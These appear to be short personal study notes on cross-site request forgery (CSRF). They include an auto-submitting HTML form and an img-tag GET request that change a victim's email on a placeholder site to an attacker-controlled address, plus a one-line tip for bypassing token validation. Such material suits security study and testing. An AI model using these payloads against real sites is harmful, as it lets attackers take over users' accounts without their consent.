# CSRF
CSRF is an attack when attacker induces user to perform some actions on site that they didn't want to do.  
```
<html>
    <body>
        <form action="https://vulnerable-website.com/email/change" method="POST">
            <input type="hidden" name="email" value="pwned@evil-user.net" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```
This html page will force user to change email  
Easiest way to construct CSRF page is to use CSRF PoC from engagement tools  
If it's possible to perform CSRF via GET request, we can use smth like this:
```
<img src="https://vulnerable-website.com/email/change?email=pwned@evil-user.net">
```
## Bypassing CSRF token validation  
Switch POST to GET  
